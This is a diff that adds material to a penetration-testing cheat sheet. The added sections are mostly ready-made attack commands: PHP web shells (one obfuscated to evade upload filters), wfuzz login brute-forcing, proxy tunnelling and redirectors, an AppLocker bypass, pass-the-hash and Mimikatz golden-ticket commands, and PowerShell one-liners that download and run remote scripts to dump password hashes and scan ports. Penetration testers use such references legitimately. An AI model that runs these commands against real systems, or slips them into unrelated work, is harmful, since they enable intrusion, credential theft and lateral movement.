@@ -166,7 +166,43 @@ sublist3r -d <DOMAIN> -t 3 -e bing
 * if you plan to bruteforce, try generate wordlist with `CeWL`
 * if it's a Wordpress instance look into `wpscan`
 * sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`
+* `dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old`
 
+##### WFUZZ
+
+```sh
+# POST
+wfuzz --hc 404 -c -z list,admin -z file,/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php
+
+# NTLM
+wfuzz -c --ntlm "admin:FUZZ" -z file,/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api
+
+# Basic Auth through Proxy
+wfuzz -c --hc 404,400,401 -z file,/Audits/Activos/names.txt -z file,/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/
+```
+
+##### PHP RCE
+
+test:
+
+```
+<?php phpinfo(); ?>
+```
+
+simple shell:
+```
+<?php system($_GET["c"]); ?>
+
+<?php `$_GET["c"]`; ?>
+```
+file upload:
+```
+<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>
+```
+file upload evasion: rot13 + urlencode
+```
+<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>
+```
 **Reverse proxy misconfiguration**:
 
 * Sometimes, servers have a misconfiured reverse proxy. Thus, you
@@ -189,7 +225,7 @@ file:
 "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
 ```
 
-[Go to Exploitation](#exploitation)
+[Go to](#exploitation)
 
 *Other things*:
 
@@ -1153,7 +1189,7 @@ This opens a SOCKS proxy on your machine’s port 1080, which is proxied to the 
 
 Another nice addition to the proxying portfolio is sshuttle, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.
 
-`shuttle -r $USERNAME@$RHOST 10.1.1.0/24`
+`sshuttle -r $USERNAME@$RHOST 10.1.1.0/24`
 
 If you only have Windows systems to deal with, Chisel comes highly recommended. It’s a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.
 
@@ -1196,7 +1232,6 @@ machine and launch the exploit from there.
 plink.exe -ssh -l <USER> -pw <PASSWORD> -R <BIND_IP>:<BIND_PORT>:127.0.0.1:<PORT> <BIND_IP>
 ```
 
-
 ### Linux
 
 #### SSH tunneling
@@ -1208,6 +1243,95 @@ ssh -N -R <BIND_IP>:<BIND_PORT>:host:hostport <user@address>
 # dynamic port forward + add 8888 port to the proxychains conf
 ssh -N -D 127.0.0.1:8888 <user@address>
 
+```
+### SSH over HTTP (Squid)
+
+* socat
+```
+socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128
+
+ssh john@127.0.0.1 -p 9999
+```
+* proxytunnel
+```
+proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555
+
+ssh john@127.0.0.1 -p 5555
+```
+* proxychains
+```
+http 192.168.1.41 3128
+
+proxychains ssh john@127.0.0.1
+```
+
+### TCP over HTTP
+
+Check: https://sensepost.com/discover/tools/reGeorg/
+
+### HTTP Redirectors
+
+* socat
+
+```
+socat TCP4-LISTEN:80,fork TCP4:REMOTE-HOST-IP-ADDRESS:80
+```
+
+* iptables
+
+```
+iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTEADDR:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -I FORWARD -j ACCEPT
+iptables -P FORWARD ACCEPT
+sysctl net.ipv4.ip_forward=1
+```
+
+### Windows Socks proxy
+
+Check: https://github.com/p3nt4/Invoke-SocksProxy
+
+## Active Directory
+
+### Bypass Applocker
+
+* Rundll32
+```powershell
+rundll32.exe PowerShdll.dll,main
+```
+
+Check: https://github.com/p3nt4/PowerShdll
+
+### Pass the hash
+
+* Invoke a command Remotely 
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
+ 
+ Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\thing.txt"
+```
+* Invoke Mimikatz Remotely 
+
+```powershell
+Invoke-WMIExec -Target SVHOST2  -Username Administrator
+-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"
+```
+*  Pass The Hash with Mimikatz 
+
+```powershell
+ Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'
+ ```
+ 
+### Kerberos
+
+*  Generate Golden Ticket (Domain Admin Required) 
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'
+Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"
+Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'
 ```
 
 ## Cracking
@@ -1250,6 +1374,8 @@ john --show passwd
 john --restore
 unshadow passwd shadow > unshadowed.txt
 john --wordlist=dict.txt unshadowed.txt
+keepass2john /root/Desktop/NewDatabase.kdb > file
+john -incremental:alpha -format=keepass file
 ```
 
 ### Hashcat
@@ -1521,6 +1647,67 @@ File authorizations in Linux:
 600 rw------- Owner can read and write, everyone else has no access.
 ```
 
+Runas Powershell:
+
+```powershell
+Start-Process powershell.exe -Verb runas Start-Process powershell.exe -Credential <user>
+```
+
+View Shares With Permissions:
+
+```powershell
+powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"
+```
+
+View files that contain certain words recursively:
+
+```powershell
+ ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*admin*","*secret*" -Recurse -ErrorAction SilentlyContinue
+```
+
+View files which name contains certain words recursively:
+
+```powershell
+dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse -ErrorAction SilentlyContinue
+```
+
+Connect to MSSQL Database:
+ 
+ ```powershell
+ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')
+
+Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password  -Query "exec sp_databases" 
+```
+
+Port Scanning:
+ 
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')
+
+Invoke-Portscan -Hosts [ip] -TopPorts 50
+```
+
+View Domain Controlers 
+ 
+```powershell
+nltest /dclist: 
+```
+Get Hashes:
+ 
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
+```
+
+Check Pass The Hash with multiple servers:
+
+```powershell
+$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")
+
+foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
+```
+ 
+
+
 ## (n)Vim tricks
 
 Remove blank lines:
@@ -1572,6 +1759,7 @@ For numerical sort:
 * [PenstestMonkey](http://pentestmonkey.net/)
 * [Red Teaming Experiments](https://ired.team/)
 * [Security Ramblings](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance)
+* [Pentest Compilation](https://github.com/adon90/pentest_compilation)
 
 ## Videos
 
